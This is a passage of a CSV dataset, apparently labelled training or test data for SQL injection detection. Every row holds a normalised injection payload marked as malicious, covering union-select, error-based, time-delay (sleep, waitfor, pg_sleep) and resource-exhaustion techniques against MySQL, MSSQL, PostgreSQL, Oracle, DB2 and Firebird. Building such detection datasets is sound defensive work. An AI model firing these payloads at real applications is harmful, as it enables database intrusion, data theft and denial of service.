row_index,payload_norm,label,sqli_type_hint
3390,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) # fmxq",1,
3391,"-1512 union all select 9013,9013,9013,9013#",1,
3392,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) )",1,
3393,"1' ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
3394,1 waitfor delay '0:0:5'-- nnnp,1,
3395,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,
3396,1' ) ) as yqek where 1957 = 1957,1,
3397,"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""fjwv"" like ""fjwv",1,
3398,1 ) as hggi where 6511 = 6511,1,
3399,"1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'gxpr' = 'gxpr",1,
3400,"-6662"" ) ) union all select 6755--",1,
3401,1'+ ( select 'hplm' where 4008 = 4008 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
3402,"1' ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
3403,"1"" ) ) and make_set ( 8266 = 9226,9226 ) and ( ( ""omjx"" like ""omjx",1,
3404,1'|| ( select 'oxdh' where 6967 = 6967 and sleep ( 5 ) #,1,
3405,select ( case when ( 5698 = 3453 ) then 5698 else 1/ ( select 0 ) end ) --,1,
3406,"-5776%' union all select 3075,3075,3075,3075,3075--",1,
3407,"1' ) ) as oldh where 9551 = 9551 union all select null,null,null#",1,
3408,1 rlike sleep ( 5 ) #,1,
3409,1 ) rlike ( select ( case when ( 5477 = 7492 ) then 1 else 0x28 end ) ) and ( 4427 = 4427,1,
3410,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""sckh"" = ""sckh",1,
3411,"1"" ) where 1607 = 1607",1,
3412,1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( '%' = ',1,
3413,"-4194"" ) ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""ddbc"" like ""ddbc",1,
3414,"1 ) ) as rual where 4649 = 4649 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,
3415,"1%"" ) ) union all select null--",1,
3416,1'+ ( select 'czpg' where 6627 = 6627 and 2006 = 2006,1,
3417,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( ""%"" = """,1,
3418,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'zqiw' = 'zqiw,1,
3419,-1564' ) order by 1--,1,
